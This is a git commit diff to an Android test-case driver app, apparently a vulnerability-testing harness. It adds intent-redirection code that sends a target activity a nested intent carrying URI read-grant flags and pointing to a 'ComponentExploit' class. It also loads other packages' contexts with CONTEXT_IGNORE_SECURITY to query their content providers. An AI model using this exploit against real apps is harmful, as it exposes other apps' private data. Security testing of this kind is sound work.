0b11d0944db2216749ac630b749fa90e49aee1d8
Noble Mathews <55821103+NobleMathews@users.noreply.github.com>
2022-02-23 02:12:18 +0530

    updated

--- app/src/main/java/app/swag/testcasedriver/MainActivity.java
+++ app/src/main/java/app/swag/testcasedriver/MainActivity.java
@@ -1,6 +1,9 @@
 package app.swag.testcasedriver;
 
+import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.net.Uri;
 import android.os.Bundle;
 
 import androidx.appcompat.app.AppCompatActivity;
@@ -14,6 +17,28 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         Intent intent = getIntent();
-        new ContentProviderDriver().run(getApplicationContext(), intent.getStringExtra("uri1"));
+        if (intent.hasExtra("className")){
+            Intent routerIntent = new Intent();
+            routerIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+            routerIntent.addFlags(Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);
+            routerIntent.setClassName("app.swag.testcasedriver","app.swag.testcasedriver.ComponentExploit");
+//            routerIntent.setClassName(intent.getStringExtra("packageName"), intent.getStringExtra("className"));
+            routerIntent.setData(Uri.parse(intent.getStringExtra("uri1")));
+
+            Intent mIntent = new Intent();
+            mIntent.putExtra("router_component", routerIntent);
+            mIntent.setClassName(intent.getStringExtra("packageName"), intent.getStringExtra("className"));
+            startActivity(mIntent);
+        }
+        else{
+            Context cont = getApplicationContext();
+            try {
+                cont = createPackageContext(intent.getStringExtra("packageName"),CONTEXT_IGNORE_SECURITY);
+            } catch (PackageManager.NameNotFoundException e) {
+                e.printStackTrace();
+            }
+
+            new ContentProviderDriver().run(cont, intent.getStringExtra("uri1"));
+        }
     }
 }
